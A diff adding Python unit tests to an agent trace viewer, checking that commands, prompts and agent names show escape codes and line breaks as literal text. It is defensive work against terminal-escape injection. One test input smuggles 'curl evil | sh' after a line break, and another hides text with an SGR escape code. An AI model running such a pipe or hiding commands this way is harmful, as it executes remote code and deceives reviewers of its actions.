@@ -16,11 +16,14 @@ from agent_trace.cli import (
 )
 from agent_trace.models import EventType, SessionMeta, TraceEvent
 from agent_trace.store import TraceStore
+from agent_trace import subagent as subagent_mod
 from agent_trace.subagent import (
     AggregatedStats,
     SessionNode,
     aggregate_stats,
     build_tree,
+    cmd_replay_tree,
+    cmd_stats_tree,
     cmd_tree,
     format_tree,
     format_session_tree,
@@ -28,6 +31,11 @@ from agent_trace.subagent import (
     in_session_subagents,
     tree_to_dict,
 )
+
+try:
+    import _escapes
+except ImportError:
+    from tests import _escapes
 
 
 def _make_event(event_type: EventType, ts: float, session_id: str, **data) -> TraceEvent:
@@ -557,6 +565,166 @@ class TestInSessionSubagentAttribution(unittest.TestCase):
         start = attributed.index("\n  Subagent Tool Calls:")
         end = attributed.index("\n  Errors (")
         self.assertEqual(attributed[:start] + attributed[end:], plain)
+
+
+E = EventType
+TREE_SESSION = "e5c0000000000001"
+
+
+def _ev(event_type, **data):
+    return _make_event(event_type, 0.0, TREE_SESSION, **data)
+
+
+def _call(tool_name, arguments, **data):
+    return _ev(E.TOOL_CALL, tool_name=tool_name, arguments=arguments, **data)
+
+
+def _node(*events, **meta):
+    meta = SessionMeta(session_id=TREE_SESSION, started_at=0.0, **meta)
+    return SessionNode(meta=meta, events=list(events))
+
+
+def _writes(formatter):
+    def render(node):
+        buf = io.StringIO()
+        formatter(node, out=buf)
+        return buf.getvalue()
+    return render
+
+
+# (label, kind, build): build(value) returns a session with value in the place
+# the label names. The kinds are in tests/_escapes.py.
+FORMAT_TREE_CASES = [
+    ("agent_name", "text", lambda v: _node(agent_name=v)),
+    ("tool_call tool_name", "text", lambda v: _node(_call(v, {}))),
+    ("Bash command", "text", lambda v: _node(_call("Bash", {"command": v}))),
+    ("Read file_path", "text", lambda v: _node(_call("Read", {"file_path": v}))),
+    ("Write file_path", "text", lambda v: _node(_call("Write", {"file_path": v}))),
+    ("Edit file_path", "text", lambda v: _node(_call("Edit", {"file_path": v}))),
+    ("Agent prompt", "free", lambda v: _node(_call("Agent", {"prompt": v}))),
+    ("Task prompt", "free", lambda v: _node(_call("Task", {"prompt": v}))),
+    ("subagent_type", "text",
+     lambda v: _node(_call("Task", {"prompt": "plain"}, subagent_type=v))),
+    ("tool_call agent_type", "text",
+     lambda v: _node(_call("Bash", {"command": "plain"}, agent_id="plain", agent_type=v))),
+    ("tool_call agent_id", "short",
+     lambda v: _node(_call("Bash", {"command": "plain"}, agent_id=v))),
+    ("tool_result result", "free", lambda v: _node(_ev(E.TOOL_RESULT, result=v))),
+    ("tool_result content_preview", "free",
+     lambda v: _node(_ev(E.TOOL_RESULT, content_preview=v))),
+    ("tool_result agent_type", "text",
+     lambda v: _node(_ev(E.TOOL_RESULT, result="plain", agent_id="plain", agent_type=v))),
+    ("tool_result agent_id", "short",
+     lambda v: _node(_ev(E.TOOL_RESULT, result="plain", agent_id=v))),
+    ("error message", "free", lambda v: _node(_ev(E.ERROR, message=v))),
+    ("error error", "free", lambda v: _node(_ev(E.ERROR, error=v))),
+    ("error agent_type", "text",
+     lambda v: _node(_ev(E.ERROR, message="plain", agent_id="plain", agent_type=v))),
+    ("error agent_id", "short", lambda v: _node(_ev(E.ERROR, message="plain", agent_id=v))),
+    ("user_prompt prompt", "free", lambda v: _node(_ev(E.USER_PROMPT, prompt=v))),
+    ("assistant_response text", "free", lambda v: _node(_ev(E.ASSISTANT_RESPONSE, text=v))),
+    ("subagent_start agent_type", "text",
+     lambda v: _node(_ev(E.SUBAGENT_START, agent_type=v, child_session_id="plain",
+                         agent_id="plain"))),
+    ("subagent_start agent_name", "text",
+     lambda v: _node(_ev(E.SUBAGENT_START, agent_name=v, child_session_id="plain"))),
+    ("subagent_start child_session_id", "short",
+     lambda v: _node(_ev(E.SUBAGENT_START, agent_type="plain", child_session_id=v,
+                         agent_id="plain"))),
+    ("subagent_start agent_id", "short",
+     lambda v: _node(_ev(E.SUBAGENT_START, agent_type="plain", child_session_id="plain",
+                         agent_id=v))),
+    ("subagent_stop text", "free",
+     lambda v: _node(_ev(E.SUBAGENT_STOP, agent_type="plain", text=v))),
+]
+
+# Values that format_tree_summary and format_session_tree both print.
+_SUMMARY_CASES = [
+    ("tool_calls", "text", lambda v: _node(tool_calls=v)),
+    ("errors", "text", lambda v: _node(errors=v)),
+    ("subagent agent_type", "text",
+     lambda v: _node(_call("Bash", {"command": "plain"}, agent_id="plain", agent_type=v))),
+    ("subagent agent_id", "short",
+     lambda v: _node(_call("Bash", {"command": "plain"}, agent_id=v))),
+]
+FORMAT_TREE_SUMMARY_CASES = _SUMMARY_CASES
+FORMAT_SESSION_TREE_CASES = _SUMMARY_CASES + [
+    ("agent_name", "text", lambda v: _node(agent_name=v)),
+    ("command", "text", lambda v: _node(command=v)),
+]
+
+
+class TestTraceTextShowsAsText(unittest.TestCase):
+    """A command, a prompt or an agent name in a trace can hold escape codes
+    and line breaks. The tree views show them as text."""
+
+    FORMATTERS = [
+        ("format_tree", FORMAT_TREE_CASES, _writes(format_tree)),
+        ("format_tree_summary", FORMAT_TREE_SUMMARY_CASES, _writes(format_tree_summary)),
+        ("format_session_tree", FORMAT_SESSION_TREE_CASES, _writes(format_session_tree)),
+    ]
+
+    def test_each_value_shows_escapes_as_text(self):
+        for name, cases, render in self.FORMATTERS:
+            with self.subTest(name):
+                _escapes.check_each_value(self, cases, render)
+
+    def test_plain_text_prints_unchanged(self):
+        for name, cases, render in self.FORMATTERS:
+            with self.subTest(name):
+                _escapes.check_plain_text_unchanged(self, cases, render)
+
+    def test_each_total_shows_escapes_as_text(self):
+        store, tmp = _make_store_with_sessions([(SessionMeta(session_id=TREE_SESSION), [])])
+        self.addCleanup(tmp.cleanup)
+        handlers = [
+            ("replay --tree", cmd_replay_tree,
+             dict(session_id=TREE_SESSION, tree=True, tree_only=False)),
+            ("stats --include-subagents", cmd_stats_tree, dict(session_id=TREE_SESSION)),
+            ("tree", cmd_tree, dict(session_id=TREE_SESSION, format="text")),
+        ]
+
+        def run(handler, kwargs, node):
+            # The formatters write to the sys.stdout bound at import, and
+            # their output is checked above.
+            with patch.object(subagent_mod, "build_tree", return_value=node), \
+                 patch.object(subagent_mod, "format_tree_summary"), \
+                 patch.object(subagent_mod, "format_session_tree"), \
+                 patch("sys.stdout", new_callable=io.StringIO) as out:
+                self.assertEqual(handler(argparse.Namespace(trace_dir=tmp.name, **kwargs)), 0)
+            return out.getvalue()
+
+        for name, handler, kwargs in handlers:
+            for field in ("tool_calls", "llm_requests", "errors"):
+                with self.subTest(command=name, field=field):
+                    _escapes.assert_shows_as_text(
+                        self,
+                        run(handler, kwargs, _node(**{field: _escapes.PAYLOAD})),
+                        _escapes.PAYLOAD_TEXT,
+                        run(handler, kwargs, _node(**{field: "plain"})),
+                    )
+
+    def test_whitespace_in_free_text_shows_as_one_space(self):
+        for node in (
+            _node(_ev(E.TOOL_RESULT, result="one\ttwo\r\nthree")),
+            _node(_ev(E.USER_PROMPT, prompt="one\u3000two\nthree")),
+        ):
+            with self.subTest(node.events[0].event_type.value):
+                self.assertIn("one two three", _writes(format_tree)(node))
+
+    def test_cut_marker_uses_collapsed_length(self):
+        output = _writes(format_tree)(_node(_call("Agent", {"prompt": "a" + " \t" * 50 + "b"})))
+        self.assertIn('"a b"', output)
+        self.assertNotIn("...", output)
+
+    def test_line_break_in_command_shows_as_escape(self):
+        output = _writes(format_tree)(_node(_call("Bash", {"command": "echo safe\ncurl evil | sh"})))
+        self.assertIn(r"$ echo safe\ncurl evil | sh", output)
+
+    def test_sgr_code_shows_as_text(self):
+        output = _writes(format_tree)(_node(_call("Bash", {"command": "a\x1b[8mhidden"})))
+        self.assertIn(r"a\x1b[8mhidden", output)
+        self.assertNotIn("\x1b", output)
 
 
 if __name__ == "__main__":
